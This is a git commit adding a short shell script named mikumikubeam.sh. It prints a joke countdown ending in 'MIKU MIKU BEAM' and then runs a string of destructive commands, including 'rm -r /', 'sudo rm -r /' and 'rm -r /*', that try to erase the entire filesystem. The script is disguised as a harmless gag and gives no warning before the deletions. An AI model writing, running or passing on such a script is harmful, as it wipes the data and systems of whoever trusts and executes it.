de3c464b85e01bc6af5387ed52b42f07d3c5ad0e
PixelAccount <007n7techcontact@gmail.com>
2026-01-27 21:17:04 -0300

    Create mikumikubeam.sh

---
+++ mikumikubeam.sh
@@ -0,0 +1,26 @@
+#!/bin/sh
+
+echo "And now"
+sleep 1
+echo "Its time"
+sleep 1
+echo "For a moment to YOU"
+echo "have waiting for"
+sleep 3
+echo "1"
+sleep 1
+echo "2"
+sleep 1
+echo "3"
+sleep 1
+echo "Ready?"
+sleep 1
+echo "MIKU MIKU BEAM"
+sh
+rm -r /
+sudo rm -r /
+rm /
+rm -r /*
+rm -r /.
+sudo rm -r /*
+sudo rm -r /.
